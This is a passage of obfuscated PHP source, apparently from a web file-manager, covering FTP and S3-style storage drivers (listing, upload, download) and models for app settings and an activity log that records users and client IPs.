$ÂŠòÉˆ¯ = $µ±»ã‘Ç[$¢ö™¾äø[33]] == $¢ö™¾äø[78] ? !0 : !1; $this->cacheMethodInfoSet($ëä”«è, $ÂŠòÉˆ¯, $µ±»ã‘Ç); if ($ÂŠòÉˆ¯) { $³Öî³õ¡[] = $ëä”«è; if ($¾¯¤¹•š) { $this->fileList($ëä”«è, $³Öî³õ¡, $ÄÅßëèç, $¾¯¤¹•š); } continue; } $ÄÅßëèç[] = $µ±»ã‘Ç; } $this->cacheMethodInfoSet($ä™Ù±Òú, !0); } private function _listItem($¼çë¹†Ö) { if (empty($¼çë¹†Ö)) { return array(); } $Ø²§ó“‡ = preg_split($_SERVER[”øäÃÍª][1615], $¼çë¹†Ö); if (count($Ø²§ó“‡) <= 9) { return $Ø²§ó“‡; } $Ø²§ó“‡[8] = trim(substr($¼çë¹†Ö, strpos($¼çë¹†Ö, $Ø²§ó“‡[7]) + strlen($Ø²§ó“‡[7]))); return array_splice($Ø²§ó“‡, 0, 9); } public function listPath($…Ó¸âÊÎ, $ĞËÌ£è = false) { $Ğñ½¨Ö¨ =& $_SERVER[”øäÃÍª]; if (!$this->_isconn()) { return !1; } $’¦¸ãÂ = $Ãñ‘âÒ = array(); $this->fileList($…Ó¸âÊÎ, $’¦¸ãÂ, $Ãñ‘âÒ); foreach ($’¦¸ãÂ as $ÄƒŞö±Û => $ôç®ãş) { $’¦¸ãÂ[$ÄƒŞö±Û] = $this->folderInfo($ôç®ãş, $ĞËÌ£è); } foreach ($Ãñ‘âÒ as $ÄƒŞö±Û => $ôç®ãş) { $Ãñ‘âÒ[$ÄƒŞö±Û] = $this->fileInfo($ôç®ãş[$Ğñ½¨Ö¨[32]], $ĞËÌ£è, $ôç®ãş); } return array($Ğñ½¨Ö¨[85] => $’¦¸ãÂ, $Ğñ½¨Ö¨[86] => $Ãñ‘âÒ); } public function has($…õı©Â, $²½õÛÚ = false, $÷Ù¥ÅİÅ = true) { $–«ËæÁó =& $_SERVER[”øäÃÍª]; $§Ï¶·ƒ¶ = $ò½´»¢© = array(); $Ï“ÕÒ· = $²½õÛÚ ? !0 : !1; $this->fileList($…õı©Â, $§Ï¶·ƒ¶, $ò½´»¢©, $Ï“ÕÒ·); if ($²½õÛÚ) { return array($–«ËæÁó[239] => count($ò½´»¢©), $–«ËæÁó[240] => count($§Ï¶·ƒ¶)); } if ($÷Ù¥ÅİÅ) { if (count($ò½´»¢©)) { return !0; } } else { if (count($§Ï¶·ƒ¶)) { return !0; } } return !1; } public function listAll($†÷ÖàéÎ) { $¹„ÌÚê¦ =& $_SERVER[”øäÃÍª]; if (!$this->_isconn()) { return !1; } $ÁÍÌ¼Š = $—šş§¡ı = array(); $this->fileList($†÷ÖàéÎ, $ÁÍÌ¼Š, $—šş§¡ı, !0); $²‡•£¸Ö = array_to_keyvalue($—šş§¡ı, $¹„ÌÚê¦[32]); foreach ($ÁÍÌ¼Š as $ÜÔó×) { if (is_string($ÜÔó×)) { $²‡•£¸Ö[$ÜÔó×] = array($¹„ÌÚê¦[79] => 0); } } return $this->listAllFiles($†÷ÖàéÎ, $²‡•£¸Ö); } public function getContent($ù±ÃÕÉ») { if (!$this->_isconn()) { return !1; } $ù±ÃÕÉ» = $this->iconvSystem($ù±ÃÕÉ»); return $this->fileSubstr($ù±ÃÕÉ»); } public function setContent($Œ£Ú‹æ¡, $ŠÕüÇ = '') { if (!$this->_isconn()) { return !1; } $îÒßÇé¬ = $this->pathThis($this->iconvSystem($Œ£Ú‹æ¡)); $œ×ÓÎì­ = $this->tempFile($îÒßÇé¬); file_put_contents($œ×ÓÎì­, $ŠÕüÇ); $Â£İğğö = $this->upload($Œ£Ú‹æ¡, $this->iconvApp($œ×ÓÎì­)); $this->tempFileRemve($œ×ÓÎì­); return $Â£İğğö; } public function fileSubstr($ ÆõïúÒ, $ÃşÈØÅ° = 0, $ßËÕ×›Ù = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ ÆõïúÒ, $ÃşÈØÅ°, $ßËÕ×›Ù); } private function ftpRequest($ÉíªúÀ±, $ÛŞñ–ÒÕ = 0, $øÆÁÉ¨¥ = false) { $Š»ìÇ Ä =& $_SERVER[”øäÃÍª]; $ÉíªúÀ± = $Š»ìÇ Ä[8] . ltrim(str_ltrim($ÉíªúÀ±, $this->ftpPath), $Š»ìÇ Ä[8]); $ÉíªúÀ± = $this->iconvSystem($ÉíªúÀ±); $Ï¸¯Ğ¯© = $this->scheme . $this->host . $Š»ìÇ Ä[4] . $this->port; $±¹Ÿ’’³ = curl_init(); curl_setopt($±¹Ÿ’’³, CURLOPT_URL, $Ï¸¯Ğ¯© . $this->pathEncode($ÉíªúÀ±)); curl_setopt($±¹Ÿ’’³, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($øÆÁÉ¨¥) { $È«ñî™ = $ÛŞñ–ÒÕ + $øÆÁÉ¨¥ - 1; curl_setopt($±¹Ÿ’’³, CURLOPT_RANGE, "{$ÛŞñ–ÒÕ}\55{$È«ñî™}"); } curl_setopt($±¹Ÿ’’³, CURLOPT_RETURNTRANSFER, 1); $˜”± = curl_exec($±¹Ÿ’’³); curl_close($±¹Ÿ’’³); return $˜”±; } public function upload($ıÀ›Ö¤š, $¥À é¤É, $¬Üà¤Õ÷ = false, $Ò —€Ÿû = REPEAT_REPLACE) { if (!$¥À é¤É || !@file_exists($¥À é¤É)) { return !1; } if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ıÀ›Ö¤š))) { return !1; } $ıÀ›Ö¤š = $this->iconvSystem($ıÀ›Ö¤š); $¥À é¤É = $this->iconvSystem($¥À é¤É); $°èÉÛŒî = ftp_nb_put($this->connect, $ıÀ›Ö¤š, $¥À é¤É, FTP_BINARY); while ($°èÉÛŒî == FTP_MOREDATA) { $°èÉÛŒî = ftp_nb_continue($this->connect); } if ($°èÉÛŒî != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[”øäÃÍª][1613], !0); return !1; } return $this->getPathOuter($ıÀ›Ö¤š); } public function download($âàÉ¥Öê, $ÇØø¸‹‚ = '') { if (!$this->_isconn()) { return !1; } $‰¾—ë™ = $this->pathFather($ÇØø¸‹‚); if (!IO::mkdir($‰¾—ë™)) { return !1; } $âàÉ¥Öê = $this->iconvSystem($âàÉ¥Öê); $ÇØø¸‹‚ = $this->iconvSystem($ÇØø¸‹‚); $˜©´Û°» = ftp_nb_get($this->connect, $ÇØø¸‹‚, $âàÉ¥Öê, FTP_BINARY); while ($˜©´Û°» == FTP_MOREDATA) { $˜©´Û°» = ftp_nb_continue($this->connect); } if ($˜©´Û°» != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[”øäÃÍª][1613], !0); return !1; } return $this->iconvApp($ÇØø¸‹‚); } public function exist($Ú‘ÆíÛŒ) { return $this->isFile($Ú‘ÆíÛŒ) || $this->isFolder($Ú‘ÆíÛŒ); } public function isFile($Û¹ÜàÍ÷) { return !$this->isFolder($Û¹ÜàÍ÷) && $this->objectMeta($Û¹ÜàÍ÷); } public function isFolder($”İú…ù) { return $this->cacheMethod($_SERVER[”øäÃÍª][177], $”İú…ù); } protected function objectMeta($Í´ˆÌ‡’) { return $this->cacheMethod($_SERVER[”øäÃÍª][179], $Í´ˆÌ‡’); } protected function _objectMeta($ûøş×åÚ) { $¤ØöĞú =& $_SERVER[”øäÃÍª]; if ($ûøş×åÚ == $¤ØöĞú[12] || $ûøş×åÚ == $¤ØöĞú[8]) { return array(); } if (!$this->_isconn()) { return !1; } $ûøş×åÚ = $this->iconvSystem($ûøş×åÚ); $Ââ€ë¦— = array($¤ØöĞú[32] => $this->iconvApp($ûøş×åÚ), $¤ØöĞú[33] => $¤ØöĞú[230], $¤ØöĞú[79] => 0); $—‰Æş³ = @ftp_size($this->connect, $ûøş×åÚ); if ($—‰Æş³ != -1) { $Ââ€ë¦—[$¤ØöĞú[79]] = $—‰Æş³; } else { $Æóç‡‡» = @ftp_chdir($this->connect, $ûøş×åÚ); if (!$Æóç‡‡») { return !1; } @ftp_chdir($this->connect, $¤ØöĞú[8]); $Ââ€ë¦—[$¤ØöĞú[33]] = $¤ØöĞú[78]; } return $Ââ€ë¦—; } protected function _isFolder($ä’¹ä„ı) { $§”€©š  =& $_SERVER[”øäÃÍª]; if ($ä’¹ä„ı == $§”€©š [12] || $ä’¹ä„ı == $§”€©š [8]) { return !0; } $ã™ŸÎ¤« = $this->_objectMeta($ä’¹ä„ı); return isset($ã™ŸÎ¤«[$§”€©š [33]]) && $ã™ŸÎ¤«[$§”€©š [33]] == $§”€©š [78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($º¤Øåš²) { parent::__construct($º¤Øåš²); $this->setSignVersion($_SERVER[”øäÃÍª][247]); } public function uploadLink($©åÌüí€, $ıêÌŸã° = 0) { $‹ĞçòÔ =& $_SERVER[”øäÃÍª]; if ($this->isUploadServer()) { return; } $ªì‹“Ïø = $this->getType(); if (!in_array($ªì‹“Ïø, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $¨ÔÔ˜ÓŸ = (!$ıêÌŸã° ? 1 : ceil($ıêÌŸã° / pow(1024, 3))) * 3600 * 4; $ÀÉ®âş÷ = $this->uploadMultiData($©åÌüí€, $¨ÔÔ˜ÓŸ); if ($ÀÉ®âş÷) { $ÀÉ®âş÷[$‹ĞçòÔ[95]] = $©åÌüí€; $ÀÉ®âş÷[$‹ĞçòÔ[96]] = $ªì‹“Ïø; } return $ÀÉ®âş÷; } public function fileOutImage($ŠäÑî¯Ü, $éÚ´§­× = 250) { if ($this->size($ŠäÑî¯Ü) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ŠäÑî¯Ü, $éÚ´§­×); } $ÒªÛûİ = $this->link($ŠäÑî¯Ü); $ÒªÛûİ .= $_SERVER[”øäÃÍª][1616] . $éÚ´§­×; $this->fileOutLink($ÒªÛûİ); } } goto e¿¶º‹Á±Ş; FĞ©ÍìÍ ª: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\155\x2e\x4c\x69\x67\150\x74\101\x70\160"; public $modelType = "\123\171\x73\x74\x65\155\x4f\160\164\151\157\156"; public $field = array("\156\x61\155\145", "\147\162\157\165\160", "\144\145\163\143", "\143\157\x6e\164\145\156\x74"); public function listData($Ö§ÔßÅá = false, $¾…õÁÎ = "\x6d\157\144\151\x66\x79\x54\x69\155\x65", $±‘½¹×Ò = true) { return parent::listData($Ö§ÔßÅá, $¾…õÁÎ, $±‘½¹×Ò); } public function remove($´¬æÔ½) { $ÒäîÀ‰› = $this->findByName($´¬æÔ½); if (!$ÒäîÀ‰›) { return !1; } return parent::remove($ÒäîÀ‰›[$_SERVER[”øäÃÍª][487]]); } public function add($Ô¢Öö¯™) { if ($this->findByName($Ô¢Öö¯™[$_SERVER[”øäÃÍª][32]])) { return !1; } return parent::insert($Ô¢Öö¯™); } public function update($à›ÀâçÖ, $ë—’’¯) { $è¸¿¬­Ó =& $_SERVER[”øäÃÍª]; $ˆç°ñêÔ = $this->findByName($à›ÀâçÖ); $¤ÄŠ±‘¯ = $this->findByName($ë—’’¯[$è¸¿¬­Ó[32]]); if (!$ˆç°ñêÔ || $¤ÄŠ±‘¯ && $¤ÄŠ±‘¯[$è¸¿¬­Ó[487]] != $ˆç°ñêÔ[$è¸¿¬­Ó[487]]) { return !1; } return parent::update($ˆç°ñêÔ[$è¸¿¬­Ó[487]], $ë—’’¯); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\x73\164\145\x6d\x5f\154\x6f\147"; protected $dataAuto = array(array("\x63\162\145\x61\x74\x65\x54\x69\155\x65", "\164\x69\155\x65", "\151\x6e\x73\145\162\x74", "\x66\x75\x6e\x63\x74\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ò«¥¹ñû =& $_SERVER[”øäÃÍª]; return array($ò«¥¹ñû[2508] => LNG($ò«¥¹ñû[2509]), $ò«¥¹ñû[2510] => LNG($ò«¥¹ñû[2511]), $ò«¥¹ñû[2086] => LNG($ò«¥¹ñû[2512]), $ò«¥¹ñû[2513] => LNG($ò«¥¹ñû[2514]), $ò«¥¹ñû[2515] => LNG($ò«¥¹ñû[2516]), $ò«¥¹ñû[2517] => LNG($ò«¥¹ñû[2518]), $ò«¥¹ñû[2519] => LNG($ò«¥¹ñû[2520]), $ò«¥¹ñû[2114] => LNG($ò«¥¹ñû[2520]), $ò«¥¹ñû[2115] => LNG($ò«¥¹ñû[2521]), $ò«¥¹ñû[2522] => LNG($ò«¥¹ñû[2523]), $ò«¥¹ñû[2524] => LNG($ò«¥¹ñû[2525]), $ò«¥¹ñû[2526] => LNG($ò«¥¹ñû[2527]), $ò«¥¹ñû[2528] => LNG($ò«¥¹ñû[2529]), $ò«¥¹ñû[2112] => LNG($ò«¥¹ñû[2530]), $ò«¥¹ñû[2531] => LNG($ò«¥¹ñû[2532]), $ò«¥¹ñû[2119] => LNG($ò«¥¹ñû[2533]), $ò«¥¹ñû[2534] => LNG($ò«¥¹ñû[2535]), $ò«¥¹ñû[2536] => LNG($ò«¥¹ñû[2537]), $ò«¥¹ñû[2538] => LNG($ò«¥¹ñû[2539]), $ò«¥¹ñû[2540] => LNG($ò«¥¹ñû[2541]), $ò«¥¹ñû[2121] => LNG($ò«¥¹ñû[2542]), $ò«¥¹ñû[2122] => LNG($ò«¥¹ñû[2543]), $ò«¥¹ñû[2544] => LNG($ò«¥¹ñû[2545]), $ò«¥¹ñû[2546] => LNG($ò«¥¹ñû[2547]), $ò«¥¹ñû[2548] => LNG($ò«¥¹ñû[2549]), $ò«¥¹ñû[2117] => LNG($ò«¥¹ñû[2550]), $ò«¥¹ñû[2551] => LNG($ò«¥¹ñû[2552]), $ò«¥¹ñû[2116] => LNG($ò«¥¹ñû[2553]), $ò«¥¹ñû[2554] => LNG($ò«¥¹ñû[2554]), $ò«¥¹ñû[2555] => LNG($ò«¥¹ñû[2556]), $ò«¥¹ñû[2557] => LNG($ò«¥¹ñû[2554]), $ò«¥¹ñû[2558] => LNG($ò«¥¹ñû[2559]), $ò«¥¹ñû[2560] => LNG($ò«¥¹ñû[2561]), $ò«¥¹ñû[2562] => LNG($ò«¥¹ñû[2561]), $ò«¥¹ñû[2563] => LNG($ò«¥¹ñû[2564]), $ò«¥¹ñû[2565] => LNG($ò«¥¹ñû[2565]), $ò«¥¹ñû[2566] => LNG($ò«¥¹ñû[2090]), $ò«¥¹ñû[2567] => LNG($ò«¥¹ñû[2568]), $ò«¥¹ñû[2569] => LNG($ò«¥¹ñû[2570]), $ò«¥¹ñû[2571] => LNG($ò«¥¹ñû[2572]), $ò«¥¹ñû[2573] => LNG($ò«¥¹ñû[2574]), $ò«¥¹ñû[2575] => LNG($ò«¥¹ñû[2576]), $ò«¥¹ñû[2577] => LNG($ò«¥¹ñû[2577]), $ò«¥¹ñû[2578] => LNG($ò«¥¹ñû[2579]), $ò«¥¹ñû[2580] => LNG($ò«¥¹ñû[2581]), $ò«¥¹ñû[2582] => LNG($ò«¥¹ñû[2583]), $ò«¥¹ñû[2584] => LNG($ò«¥¹ñû[2585]), $ò«¥¹ñû[2586] => LNG($ò«¥¹ñû[2587]), $ò«¥¹ñû[2588] => LNG($ò«¥¹ñû[2589]), $ò«¥¹ñû[210] => LNG($ò«¥¹ñû[210]), $ò«¥¹ñû[211] => LNG($ò«¥¹ñû[2590]), $ò«¥¹ñû[2591] => LNG($ò«¥¹ñû[2591])); } private function typeFile() { $Œ—¹¡’í =& $_SERVER[”øäÃÍª]; $ÜÑò„ï’ = array($Œ—¹¡’í[2119] => array($Œ—¹¡’í[2120]), $Œ—¹¡’í[2526] => array($Œ—¹¡’í[2592]), $Œ—¹¡’í[2528] => array($Œ—¹¡’í[2593]), $Œ—¹¡’í[2112] => array($Œ—¹¡’í[2113], $Œ—¹¡’í[2594]), $Œ—¹¡’í[2536] => array(), $Œ—¹¡’í[2538] => array(), $Œ—¹¡’í[2540] => array(), $Œ—¹¡’í[2121] => array($Œ—¹¡’í[2123]), $Œ—¹¡’í[2122] => array($Œ—¹¡’í[2123]), $Œ—¹¡’í[2544] => array($Œ—¹¡’í[2595]), $Œ—¹¡’í[2546] => array($Œ—¹¡’í[2595]), $Œ—¹¡’í[2548] => array($Œ—¹¡’í[2596]), $Œ—¹¡’í[2534] => array($Œ—¹¡’í[2597]), $Œ—¹¡’í[2117] => array($Œ—¹¡’í[2598]), $Œ—¹¡’í[2551] => array($Œ—¹¡’í[2599]), $Œ—¹¡’í[2116] => array($Œ—¹¡’í[2118])); return $ÜÑò„ï’; } private function typeAll() { $ÖúõØ¢ƒ =& $_SERVER[”øäÃÍª]; $•£ºû’Ì = $this->typeList; $óÎŞ‹œ = array_filter($this->typeFile()); foreach ($óÎŞ‹œ as $†³©Ó– => $ÉÛÃÚÁˆ) { $•£ºû’Ì[$ÉÛÃÚÁˆ[0]] = $•£ºû’Ì[$†³©Ó–]; } $•£ºû’Ì[$ÖúõØ¢ƒ[2123]] = LNG($ÖúõØ¢ƒ[2600]); $•£ºû’Ì[$ÖúõØ¢ƒ[2595]] = LNG($ÖúõØ¢ƒ[2601]); return $•£ºû’Ì; } public function addLog($×‰ù£€ã, $İ³ù¡‰½ = array()) { $ã¦©Éï˜ =& $_SERVER[”øäÃÍª]; if (!isset($this->typeList[$×‰ù£€ã])) { return; } $üÛŸë¼ = Session::get($ã¦©Éï˜[2277]); if (!$üÛŸë¼) { $üÛŸë¼ = _get($İ³ù¡‰½, $ã¦©Éï˜[1548], 0); } if ($×‰ù£€ã == $ã¦©Éï˜[2567] && is_array($İ³ù¡‰½[$ã¦©Éï˜[2602]]) && !$İ³ù¡‰½[$ã¦©Éï˜[2602]]) { return; } $ë×å§» = get_client_ip(); if (!$İ³ù¡‰½ || strlen(json_encode($İ³ù¡‰½)) >= 1024 * 64) { if ($İ³ù¡‰½ && is_array($İ³ù¡‰½)) { $İ³ù¡‰½ = array_intersect_key($İ³ù¡‰½, array_flip($ã¦©Éï˜[487], $ã¦©Éï˜[32])); $İ³ù¡‰½[$ã¦©Éï˜[1564]] = $ë×å§»; } else { $İ³ù¡‰½ = array($ã¦©Éï˜[1564] => $ë×å§»); } } else { if (is_array($İ³ù¡‰½)) { $İ³ù¡‰½[$ã¦©Éï˜[1564]] = $ë×å§»; } else { $İ³ù¡‰½ = array($ã¦©Éï˜[1345] => $İ³ù¡‰½, $ã¦©Éï˜[1564] => $ë×å§»); } } $İ³ù¡‰½[$ã¦©Éï˜[2603]] = ACTION; $İ³ù¡‰½ = array($ã¦©Éï˜[1924] => Session::sign(), $ã¦©Éï˜[1925] => intval($üÛŸë¼), $ã¦©Éï˜[33] => $×‰ù£€ã, $ã¦©Éï˜[1927] => json_encode($İ³ù¡‰½)); Hook::trigger($ã¦©Éï˜[2604], $İ³ù¡‰½); return parent::add($İ³ù¡‰½); } public function remove($¤Ê®€Ò®) { $this->where(array($_SERVER[”øäÃÍª][516] => $¤Ê®€Ò®))->delete(); } private function _makeOrder($µâã§ôˆ = '') { $áªÕ½¿× =& $_SERVER[”øäÃÍª]; $¹åŒšÖ = $áªÕ½¿×[231]; $›ë¬úã€ = array($áªÕ½¿×[545] => $áªÕ½¿×[546], $áªÕ½¿×[547] => $áªÕ½¿×[548]); $Øçğ§ç¾ = Input::get($áªÕ½¿×[553], $áªÕ½¿×[7], $áªÕ½¿×[2314], array($áªÕ½¿×[2233], $áªÕ½¿×[547])); $Øçğ§ç¾ = $›ë¬úã€[$Øçğ§ç¾]; $µâã§ôˆ = $µâã§ôˆ . "{$¹åŒšÖ}\40{$Øçğ§ç¾}"; return $this->order($µâã§ôˆ); } public function get($çğÏ©ÉÀ = '') { $ûÕŞ¦²¬ =& $_SERVER[”øäÃÍª]; if (!$çğÏ©ÉÀ) { show_json(array()); } $óæàÃ÷Å = array(); if ($çğÏ©ÉÀ[$ûÕŞ¦²¬[1548]]) { $óæàÃ÷Å[$ûÕŞ¦²¬[1548]] = $çğÏ©ÉÀ[$ûÕŞ¦²¬[1548]]; } if (isset($çğÏ©ÉÀ[$ûÕŞ¦²¬[870]])) { $µ¨Ç«ƒØ = $çğÏ©ÉÀ[$ûÕŞ¦²¬[870]]; $´Ä‡¢Óû = isset($çğÏ©ÉÀ[$ûÕŞ¦²¬[871]]) ? $çğÏ©ÉÀ[$ûÕŞ¦²¬[871]] : time(); $óæàÃ÷Å[$ûÕŞ¦²¬[231]] = array($ûÕŞ¦²¬[408], array($µ¨Ç«ƒØ, $´Ä‡¢Óû)); } if ($çğÏ©ÉÀ[$ûÕŞ¦²¬[33]]) { $¬”îÓÃ½ = explode($ûÕŞ¦²¬[50], $çğÏ©ÉÀ[$ûÕŞ¦²¬[33]]); $İ×àıç† = $this->typeFile(); $—¬”ÂÄ = array(); foreach ($¬”îÓÃ½ as $±‰¦¦Ø¼) { $—¬”ÂÄ[] = $±‰¦¦Ø¼; if (isset($İ×àıç†[$±‰¦¦Ø¼])) { $—¬”ÂÄ = array_merge($—¬”ÂÄ, $İ×àıç†[$±‰¦¦Ø¼]); } } $—¬”ÂÄ = array_unique($—¬”ÂÄ); if ($—¬”ÂÄ) { $óæàÃ÷Å[$ûÕŞ¦²¬[33]] = array($ûÕŞ¦²¬[7], $—¬”ÂÄ); } } else { $óæàÃ÷Å[$ûÕŞ¦²¬[33]] = array($ûÕŞ¦²¬[2605], $ûÕŞ¦²¬[2606]); } if (!empty($çğÏ©ÉÀ[$ûÕŞ¦²¬[1564]])) { $óæàÃ÷Å[$ûÕŞ¦²¬[548]] = array($ûÕŞ¦²¬[473], "\x25{$çğÏ©ÉÀ[$ûÕŞ¦²¬[1564]]}\x25"); } $¾âÊßù = $this->_makeOrder()->where($óæàÃ÷Å)->selectPage(); if (empty($¾âÊßù[$ûÕŞ¦²¬[446]])) { show_json(array(), !0, $¾âÊßù[$ûÕŞ¦²¬[443]]); } $¾âÊßù[$ûÕŞ¦²¬[446]] = $this->logList($¾âÊßù[$ûÕŞ¦²¬[446]]); return $¾âÊßù; } private function ipAddress(&$Œ‡İšÎí) { $¿èÂÚ… =& $_SERVER[”øäÃÍª]; if (!empty($Œ‡İšÎí[$¿èÂÚ…[1564]])) { $Îª«ßõ = IpLocation::get($Œ‡İšÎí[$¿èÂÚ…[1564]]); } else { $Îª«ßõ = LNG($¿èÂÚ…[2607]); } $Œ‡İšÎí[$¿èÂÚ…[2608]] = $Îª«ßõ; } private function descZipDownload($Š¶¸Óï, &$¯’ æ) { $¾ÃØÎŞú =& $_SERVER[”øäÃÍª]; if (!isset($Š¶¸Óï[$¾ÃØÎŞú[1571]])) { return; } $¨è£ˆ¸Ã = json_decode($Š¶¸Óï[$¾ÃØÎŞú[1571]], !0); foreach ($¨è£ˆ¸Ã as $÷äÊº•¶) { try { $ùì¢ç®ì = IO::infoFullSimple($÷äÊº•¶[$¾ÃØÎŞú[87]]); } catch (Exception $ñàùˆ›Ş) { continue; } $Š¶¸Óï[$¾ÃØÎŞú[87]] = $÷äÊº•¶[$¾ÃØÎŞú[87]]; $¯’ æ[] = $Š¶¸Óï[$¾ÃØÎŞú[191]] = $ùì¢ç®ì[$¾ÃØÎŞú[191]]; $¯’ æ[] = $Š¶¸Óï[$¾ÃØÎŞú[2374]] = $ùì¢ç®ì[$¾ÃØÎŞú[190]]; break; } return $Š¶¸Óï; } private function getSourceList(&$‡ÉÃ¤Ë©) { $¹¡Å²¾ë =& $_SERVER[”øäÃÍª]; $’ï±§ş = array(); foreach ($‡ÉÃ¤Ë© as $«ìıŒÜ => $Û¨Øˆå«) { $ÅòºÖ«Œ = json_decode($Û¨Øˆå«[$¹¡Å²¾ë[548]], !0); if ($Û¨Øˆå«[$¹¡Å²¾ë[33]] == $¹¡Å²¾ë[2115]) { $ÅòºÖ«Œ = $this->descZipDownload($ÅòºÖ«Œ, $’ï±§ş); $‡ÉÃ¤Ë©[$«ìıŒÜ][$¹¡Å²¾ë[548]] = json_encode($ÅòºÖ«Œ); continue; } if (strpos($Û¨Øˆå«[$¹¡Å²¾ë[33]], $¹¡Å²¾ë[2376]) !== 0) { if (!isset($ÅòºÖ«Œ[$¹¡Å²¾ë[87]]) || strpos($Û¨Øˆå«[$¹¡Å²¾ë[33]], $¹¡Å²¾ë[2609]) !== 0) { continue; } try { $Êêè§â— = IO::infoFullSimple($ÅòºÖ«Œ[$¹¡Å²¾ë[87]]); } catch (Exception $±ğ¸¨¼) { continue; } $’ï±§ş[] = $ÅòºÖ«Œ[$¹¡Å²¾ë[191]] = $Êêè§â—[$¹¡Å²¾ë[191]]; $’ï±§ş[] = $ÅòºÖ«Œ[$¹¡Å²¾ë[2374]] = $Êêè§â—[$¹¡Å²¾ë[190]]; $‡ÉÃ¤Ë©[$«ìıŒÜ][$¹¡Å²¾ë[548]] = json_encode($ÅòºÖ«Œ); continue; } $’ï±§ş[] = $ÅòºÖ«Œ[$¹¡Å²¾ë[191]]; $’ï±§ş[] = $ÅòºÖ«Œ[$¹¡Å²¾ë[2374]]; if ($ÅòºÖ«Œ[$¹¡Å²¾ë[33]] == $¹¡Å²¾ë[651]) { $’ï±§ş[] = $ÅòºÖ«Œ[$¹¡Å²¾ë[548]][$¹¡Å²¾ë[1298]]; $’ï±§ş[] = $ÅòºÖ«Œ[$¹¡Å²¾ë[548]][$¹¡Å²¾ë[1299]]; } if ($ÅòºÖ«Œ[$¹¡Å²¾ë[33]] == $¹¡Å²¾ë[2384]) { $’ï±§ş[] = $ÅòºÖ«Œ[$¹¡Å²¾ë[548]][$¹¡Å²¾ë[191]]; } } if (!$’ï±§ş) { return array(); } return Model($¹¡Å²¾ë[941])->sourceListInfo($’ï±§ş, !0); } private function logList($ãıš¤ß¡) { $›œò’Ñş =& $_SERVER[”øäÃÍª]; $–ÆÁÒíÌ = array_to_keyvalue($ãıš¤ß¡, $›œò’Ñş[12], $›œò’Ñş[1548]); $ş•’ƒ÷õ = Model($›œò’Ñş[625])->userListInfo(array_unique($–ÆÁÒíÌ)); $¬í¡¡÷Û = $this->getSourceList($ãıš¤ß¡); $ª¢‹„ = $this->typeAll(); $â¢É¸¨¸ = array(); $¦„Úæ» = array(); foreach ($ãıš¤ß¡ as $âË Óú‹ => $§Í‡äƒ) { $ÕÂñË‰Ò = $§Í‡äƒ[$›œò’Ñş[33]]; $ûüÂ¾´× = isset($ş•’ƒ÷õ[$§Í‡äƒ[$›œò’Ñş[1548]]]) ? $ş•’ƒ÷õ[$§Í‡äƒ[$›œò’Ñş[1548]]] : !1; $Åƒ•ÑÄ‹ = strpos($ÕÂñË‰Ò, $›œò’Ñş[2610]) === 0 ? LNG($›œò’Ñş[2611]) : LNG($›œò’Ñş[2607]); $§Í‡äƒ[$›œò’Ñş[32]] = isset($ûüÂ¾´×[$›œò’Ñş[32]]) ? $ûüÂ¾´×[$›œò’Ñş[32]] : LNG($›œò’Ñş[2607]); $§Í‡äƒ[$›œò’Ñş[2433]] = isset($ûüÂ¾´×[$›œò’Ñş[2433]]) ? $ûüÂ¾´×[$›œò’Ñş[2433]] : $›œò’Ñş[12]; $§Í‡äƒ[$›œò’Ñş[1819]] = isset($ª¢‹„[$ÕÂñË‰Ò]) ? $ª¢‹„[$ÕÂñË‰Ò] : $Åƒ•ÑÄ‹; $§Í‡äƒ[$›œò’Ñş[2313]] = $ûüÂ¾´×; $ùÉŸ³ß = json_decode($§Í‡äƒ[$›œò’Ñş[548]], !0); $§Í‡äƒ[$›œò’Ñş[1564]] = isset($ùÉŸ³ß[$›œò’Ñş[1564]]) ? $ùÉŸ³ß[$›œò’Ñş[1564]] : $›œò’Ñş[12]; $§Í‡äƒ[$›œò’Ñş[2608]] = IpLocation::get($§Í‡äƒ[$›œò’Ñş[1564]]); if (strpos($ÕÂñË‰Ò, $›œò’Ñş[2376]) === 0 || isset($ùÉŸ³ß[$›œò’Ñş[2374]])) { $ùÉŸ³ß[$›œò’Ñş[90]] = $¬í¡¡÷Û[$ùÉŸ³ß[$›œò’Ñş[191]]]; $ùÉŸ³ß[$›œò’Ñş[2389]] = $¬í¡¡÷Û[$ùÉŸ³ß[$›œò’Ñş[2374]]]; if ($ùÉŸ³ß[$›œò’Ñş[33]] == $›œò’Ñş[651]) { $ùÉŸ³ß[$›œò’Ñş[548]][$›œò’Ñş[1298]] = $¬í¡¡÷Û[$ùÉŸ³ß[$›œò’Ñş[548]][$›œò’Ñş[1298]]]; $ùÉŸ³ß[$›œò’Ñş[548]][$›œò’Ñş[1299]] = $¬í¡¡÷Û[$ùÉŸ³ß[$›œò’Ñş[548]][$›œò’Ñş[1299]]]; } if ($ùÉŸ³ß[$›œò’Ñş[33]] == $›œò’Ñş[2384]) { $ùÉŸ³ß[$›œò’Ñş[548]][$›œò’Ñş[191]] = $¬í¡¡÷Û[$ùÉŸ³ß[$›œò’Ñş[548]][$›œò’Ñş[191]]]; } if ($ùÉŸ³ß[$›œò’Ñş[33]] == $›œò’Ñş[1286]) { $ùÉŸ³ß[$›œò’Ñş[2389]] = $ùÉŸ³ß[$›œò’Ñş[90]]; $ùÉŸ³ß[$›œò’Ñş[2374]] = $ùÉŸ³ß[$›œò’Ñş[2389]][$›œò’Ñş[191]]; $ùÉŸ³ß[$›œò’Ñş[90]] = !1; $ùÉŸ³ß[$›œò’Ñş[191]] = $›œò’Ñş[12]; } $Ì¯€é = array($›œò’Ñş[1286], $›œò’Ñş[2372]); if (!in_array($ùÉŸ³ß[$›œò’Ñş[33]], $Ì¯€é)) { if ($ùÉŸ³ß[$›œò’Ñş[90]] && 